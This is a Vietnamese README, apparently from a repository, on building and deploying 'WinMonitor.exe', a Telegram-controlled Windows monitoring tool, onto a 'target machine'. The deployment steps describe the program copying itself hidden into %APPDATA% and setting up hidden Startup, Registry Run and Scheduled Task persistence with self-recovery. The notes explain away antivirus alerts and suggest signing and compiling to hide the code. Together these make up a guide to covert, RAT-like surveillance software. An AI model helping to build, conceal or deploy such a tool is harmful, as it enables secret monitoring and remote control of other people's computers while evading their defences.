# tool_build — Đóng gói thành `WinMonitor.exe` (máy đích KHÔNG cần Python)

## Vì sao cần?

`win_monitor.pyw` / `win_monitor_mahoa.pyw` đều **cần Python** trên máy chạy. Nếu máy
đích chưa cài Python thì script không chạy được. Giải pháp: đóng gói thành **1 file
`WinMonitor.exe` độc lập** — Python và mọi thứ được nhúng sẵn bên trong.

---

## Cách 1 (KHUYẾN NGHỊ): Build tự động bằng GitHub Actions

Không cần máy Windows. Repo đã có sẵn workflow `.github/workflows/build-windows-exe.yml`.

1. Push code lên nhánh `main` (hoặc vào tab **Actions → Build Windows EXE → Run workflow**).
2. Đợi ~2 phút, vào **Actions → lần chạy mới nhất → mục Artifacts**, tải
   **`WinMonitor-windows-exe`** → trong đó có `WinMonitor.exe`.
3. (Tùy chọn) Tạo tag `v1.0.0` để tự gắn `.exe` vào **Releases**:
   ```bash
   git tag v1.0.0 && git push origin v1.0.0
   ```

---

## Cách 2: Build trên máy Windows của bạn

```bat
pip install -r tool_build/requirements.txt
python tool_build/build_exe.py
:: -> dist\WinMonitor.exe
```

Tùy chọn:
- `--onedir` : xuất ra thư mục (khởi động nhanh hơn, nhưng nhiều file)
- `--name TenKhac` : đổi tên file .exe
- Đặt file `tool_build/icon.ico` để có icon riêng.

---

## Triển khai trên máy đích (không cần Python)

1. Copy **`WinMonitor.exe`** sang máy đích.
2. Cấu hình token/chat id theo 1 trong 3 cách:
   - **a)** Chạy 1 lần: `WinMonitor.exe --token 123:ABC --chat 987654321`
   - **b)** Đặt file `winmonitor.config.json` **cạnh file .exe** (xem
     `winmonitor.config.example.json`) → tự nạp khi chạy lần đầu.
   - **c)** Dùng file cấu hình bất kỳ: `WinMonitor.exe --config C:\duong\dan.json`
3. Double-click `WinMonitor.exe`. Lần đầu chạy nó sẽ:
   - Tự copy `.exe` vào `%APPDATA%\WinMonitor\WinMonitor.exe` (ẩn)
   - Tạo shortcut ẩn trong Startup + đăng ký Registry Run + Scheduled Task
     (tự khởi động & tự phục hồi)
4. Mở Telegram, nhắn `/start`.

> Máy đích **không cần cài Python**. Chỉ cần chép file `.exe` và chạy.

---

## Lưu ý

- File `.exe` do PyInstaller tạo ra **lớn hơn** (~8–12MB) và một số phần mềm diệt
  virus có thể báo nhầm (false positive) với file PyInstaller — đây là hiện tượng
  phổ biến; có thể ký số (code signing) để giảm cảnh báo.
- Bản `.exe` **không cần** mật khẩu giải mã (vì code đã được biên dịch/nhúng sẵn),
  nhưng **vẫn giữ nguyên** toàn bộ tính năng + cơ chế OTP qua Telegram.
- Nếu muốn vừa "không cần Python" vừa "giấu code": dùng `.exe` là đủ (PyInstaller
  không để lộ source rõ ràng như `.pyw`).
- File `winmonitor.config.json` chứa token → đã nằm trong `.gitignore`, đừng commit.
